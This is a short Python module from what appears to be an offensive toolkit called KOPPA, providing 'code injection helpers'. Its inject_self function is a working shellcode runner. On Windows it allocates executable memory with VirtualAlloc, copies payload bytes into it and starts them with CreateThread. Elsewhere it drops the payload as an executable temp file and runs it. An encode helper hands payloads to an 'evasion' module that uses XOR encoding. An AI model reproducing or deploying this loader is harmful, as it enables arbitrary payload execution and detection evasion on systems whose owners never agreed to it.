"""KOPPA stdlib: inject — code injection helpers"""
import os, ctypes, subprocess

def inject_self(payload_bytes):
    """Execute payload in current process address space"""
    try:
        if os.name == "nt":
            buf = ctypes.create_string_buffer(payload_bytes)
            VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
            addr = VirtualAlloc(None, len(payload_bytes), 0x3000, 0x40)
            ctypes.memmove(addr, buf, len(payload_bytes))
            thread = ctypes.windll.kernel32.CreateThread(None, 0, addr, None, 0, None)
            ctypes.windll.kernel32.WaitForSingleObject(thread, 0xFFFFFFFF)
        else:
            import tempfile, stat
            tf = tempfile.NamedTemporaryFile(delete=False, suffix=".elf")
            tf.write(payload_bytes); tf.close()
            os.chmod(tf.name, stat.S_IRWXU)
            subprocess.Popen([tf.name])
    except Exception as e:
        print(f"\033[91m[-]\033[0m inject_self failed: {e}")

def encode(payload, encoder="xor_random", iterations=1):
    from . import evasion
    return evasion.encode(payload, encoder, iterations)
